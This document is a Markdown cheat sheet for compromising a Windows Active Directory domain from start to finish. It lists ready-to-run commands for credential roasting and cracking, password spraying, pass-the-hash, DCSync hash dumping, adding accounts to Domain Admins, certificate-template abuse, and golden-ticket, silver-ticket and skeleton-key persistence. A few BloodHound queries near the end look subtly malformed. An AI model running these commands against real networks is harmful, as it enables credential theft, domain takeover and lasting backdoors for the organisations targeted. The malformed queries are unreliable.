# Windows Active Directory — Full Attack Chain
## Last Updated: Mon Jul 06 2026

## PREREQUISITES — TOOLS
pip3 install impacket bloodhound bloodhound-ce
# Also: crackmapexec, responder, ldapdomaindump, certipy

## PHASE 1: RECON
### Enumerate domain:
nmap -p 389 --script ldap-rootdse <DC-IP>
ldapsearch -x -H ldap://<DC> -b "DC=domain,DC=com"
ldapdomaindump ldap://<DC> -u 'DOMAIN\\user' -p 'pass'

### BloodHound data collection:
bloodhound-python -u user -p pass -d domain.com -dc dc.domain.com -c All

### Enumerate users:
net users /domain
net user <user> /domain

### Enumerate groups:
net group /domain
net group "Domain Admins" /domain

## PHASE 2: INITIAL ACCESS
### AS-REP Roasting (no pre-auth users):
impacket-GetNPUsers domain.com/ -usersfile users.txt -format hashcat
# Crack: hashcat -m 18200 hash.txt rockyou.txt

### Kerberoasting (service account hashes):
impacket-GetUserSPNs domain.com/user:pass -request -outputfile hashes.txt
# Crack: hashcat -m 13100 hashes.txt rockyou.txt

### Password Spraying:
crackmapexec smb <target> -u users.txt -p 'Password123' --continue-on-success

## PHASE 3: LATERAL MOVEMENT
### Pass-the-Hash:
crackmapexec smb <target> -u admin -H <NTLM>:<LM>
impacket-psexec domain/admin@target -hashes <LM>:<NTLM>
impacket-wmiexec domain/admin@target -hashes <LM>:<NTLM>

### Pass-the-Ticket:
mimikatz "kerberos::ptt ticket.kirbi"
# Or on Linux: export KRB5CCNAME=ticket.ccache

### Overpass-the-Hash:
impacket-getTGT domain.com/user -hashes <LM>:<NTLM>
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass target.domain.com

## PHASE 4: PRIVILEGE ESCALATION
### DCSync (extract all hashes):
impacket-secretsdump domain.com/admin@<DC> -just-dc
# Or via mimikatz: lsadump::dcsync /domain:domain.com /user:krbtgt

### ACL Abuse (BloodHound paths):
# Find ACLs where user has GenericAll/WriteDACL/WriteOwner
# GenericAll on user → change password
# GenericAll on group → add user to group
# WriteDACL → grant DCSync rights

# ForceChangePassword:
net user victim Passw0rd! /domain

# Add to group:
net group "Domain Admins" user /add /domain

### AD CS Abuse (Certipy):
# ESC1: Misconfigured certificate templates
certipy find -u user@domain.com -p pass -dc-ip <DC>
certipy req -u user@domain.com -p pass -ca <CA> -template <vuln_template>

# ESC8: Web enrollment relay
certipy relay -ca <CA> -template DomainController

# Full AD CS chain: ESC1-ESC13 documented

## PHASE 5: PERSISTENCE
### Golden Ticket (forged KRBTGT):
mimikatz "kerberos::golden /domain:domain.com /sid:<SID> /krbtgt:<KRBTGT_HASH> /id:500 /ptt"

### Silver Ticket (forged service):
mimikatz "kerberos::golden /domain:domain.com /sid:<SID> /target:<SERVICE> /rc4:<SERVICE_HASH> /service:cifs /ptt"

### Skeleton Key (backdoor all users):
mimikatz "privilege::debug" "misc::skeleton"

## PHASE 6: CROSS-TRUST ATTACKS
### Trust tickets:
mimikatz "kerberos::golden /domain:domain.com /sid:<SID> /sids:<TARGET_SID> /krbtgt:<KRBTGT_HASH> /ptt"

### Child → Parent domain:
# SID History injection
# ExtraSids attack

## KEY COMMANDS CHEATSHEET
# List SPNs: setspn -T domain.com -Q */*
# Find domain controller: nltest /dsgetdc:domain.com
# Sync time: w32tm /resync /nowait
# Check AD CS: certutil -CA -ping <CA>

## BLOODHOUND CYPHER QUERIES (KEY ONES)
# Find all domain admins:
MATCH (n:User) WHERE n.domainadmin=true RETURN n

# Find shortest path to Domain Admins:
MATCH (n) WHERE n.enabled=true RETURN SHORTEST_PATH(n, (g:Group {name:'DOMAIN ADMINS@DOMAIN.COM'}))

# Find Kerberoastable users:
MATCH (n:User) WHERE n.hasspn=true RETURN n

# Find AS-REP roastable users:
MATCH (n:User) WHERE n.dontreqpreauth=true RETURN n

